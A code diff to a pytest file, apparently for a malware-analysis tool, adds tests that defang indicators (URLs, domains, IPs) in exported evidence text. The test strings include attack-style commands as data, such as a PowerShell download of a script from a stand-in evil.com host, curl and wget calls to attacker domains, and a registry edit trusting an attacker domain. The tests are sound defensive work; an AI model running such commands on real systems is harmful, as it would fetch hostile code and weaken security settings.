@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import csv
+import dataclasses
 import io
 import json
 from typing import Any
@@ -8,7 +9,7 @@ from typing import Any
 import pytest
 
 from ttprism import IOC, AnalysisOptions, AnalysisResult, IOCType, TechniqueMatch, analyze_cape, analyze_text
-from ttprism.export import escape_csv_cell, to_csv, to_dict, to_json
+from ttprism.export import defang_text, escape_csv_cell, to_csv, to_dict, to_json
 
 
 def sample_result() -> AnalysisResult:
@@ -56,6 +57,80 @@ def test_defanged_json() -> None:
     data = to_dict(sample_result(), defanged=True)
     assert data["defanged"] is True
     assert [i["value"] for i in data["iocs"]] == ["hxxps[://]evil[.]com/a", "evil[.]com", "+cmd[@]evil[.]com"]
+    assert data["techniques"][0]["evidence"] == ["command: powershell -enc AAAA"]
+
+
+def test_defanged_json_defangs_evidence() -> None:
+    result = sample_result()
+    result.techniques[0] = dataclasses.replace(
+        result.techniques[0],
+        evidence=("command: powershell iwr http://evil.com/a.ps1 -o a.ps1; ping 198.51.100.7",),
+    )
+    technique = to_dict(result, defanged=True)["techniques"][0]
+    assert technique["evidence"] == [
+        "command: powershell iwr hxxp[://]evil[.]com/a.ps1 -o a.ps1; ping 198[.]51[.]100[.]7"
+    ]
+    assert to_dict(result)["techniques"][0]["evidence"] == list(result.techniques[0].evidence)
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("named in text: T1059.001", "named in text: T1059.001"),
+        ("command: cmd.exe /c del a.ps1", "command: cmd.exe /c del a.ps1"),
+        ("command: curl evil.com/x", "command: curl evil[.]com/x"),
+        ("command: send ops@evil.com", "command: send ops[@]evil[.]com"),
+        (
+            "command: wget smb://a.evil.com/s?u=https://b.evil.net/y",
+            "command: wget smb[://]a[.]evil[.]com/s?u=hxxps[://]b[.]evil[.]net/y",
+        ),
+        ("command: HTTP://user.name@EVIL.COM:8080/a.b", "command: hxxp[://]user[.]name@EVIL[.]COM:8080/a.b"),
+        ("command: ping ::ffff:198.51.100.7", "command: ping [:][:]ffff[:]198[.]51[.]100[.]7"),
+        ("command: ping 2001:db8::1 at 12:30:45", "command: ping 2001[:]db8[:][:]1 at 12:30:45"),
+        (
+            "command: curl http://[64:ff9b::198.51.100.7]/a",
+            "command: curl hxxp[://][64:ff9b::198[.]51[.]100[.]7]/a",
+        ),
+        # Each URL of a list, also with no path between them.
+        (
+            "command: x 'http://a.example','http://b.example','http://c.example'",
+            "command: x 'hxxp[://]a[.]example','hxxp[://]b[.]example','hxxp[://]c[.]example'",
+        ),
+        *(
+            (f"x http://a.example{sep}http://b.example{sep}http://c.example", f"x {defanged}")
+            for sep in (",", "|", ";", "&", "\uff0c")
+            for defanged in [f"hxxp[://]a[.]example{sep}hxxp[://]b[.]example{sep}hxxp[://]c[.]example"]
+        ),
+        (
+            'curl -d {"a":"http://a.example","b":"https://b.example","c":"ftp://c.example"}',
+            'curl -d {"a":"hxxp[://]a[.]example","b":"hxxps[://]b[.]example","c":"fxp[://]c[.]example"}',
+        ),
+        # A "://" right after a host does not make the host the next URL's scheme.
+        ("curl http://evil.example://", "curl hxxp[://]evil[.]example://"),
+        ("curl http://1evil.example://evil2.test/a", "curl hxxp[://]1evil[.]example://evil2[.]test/a"),
+        (
+            "iwr http://very-long-subdomain-name-here.evil.example-http://b.example",
+            "iwr hxxp[://]very-long-subdomain-name-here[.]evil[.]example-http://b[.]example",
+        ),
+        # Names after characters that DOMAIN_RE does not start a name after.
+        (
+            "command: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
+            "\\ZoneMap\\Domains\\evil.example /v http /d 2",
+            "command: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
+            "\\ZoneMap\\Domains\\evil[.]example /v http /d 2",
+        ),
+        (
+            "command: dig @ns1.evil.example _dmarc.evil.example TXT",
+            "command: dig @ns1[.]evil[.]example _dmarc[.]evil[.]example TXT",
+        ),
+        (
+            "command: C:\\Windows\\System32\\cmd.exe /c System.Net.dll",
+            "command: C:\\Windows\\System32\\cmd.exe /c System.Net.dll",
+        ),
+    ],
+)
+def test_defang_text(text: str, expected: str) -> None:
+    assert defang_text(text) == expected
 
 
 def test_csv_rows_and_formula_escaping() -> None:
